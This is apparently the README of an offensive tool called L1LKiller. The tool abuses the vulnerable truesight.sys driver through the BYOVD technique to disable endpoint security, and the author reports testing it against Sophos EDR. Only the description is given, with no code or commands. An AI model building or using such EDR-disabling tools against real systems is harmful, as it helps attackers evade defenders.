<h1 align="center">「⚠️」 About L1LKiller</h1>

L1LKiller is a tool developed to exploit the `truesight.sys` driver of the Rogue Anti-Malware Driver 3.3 software through the BYOVD (Bring Your Own Vulnerable Driver) technique. About 1 year ago this vulnerability was fixed and currently the driver is present in [LOLDrivers](https://www.loldrivers.io/drivers/e0e93453-1007-4799-ad02-9b461b7e0398/) (Living Off The Land Drivers). I developed this project at the time of the release of the discovery of this driver, where I was able to successfully perform the test on Sophos EDR. Since there is already a mitigation, I decided to publish this project that I kept private for a while.
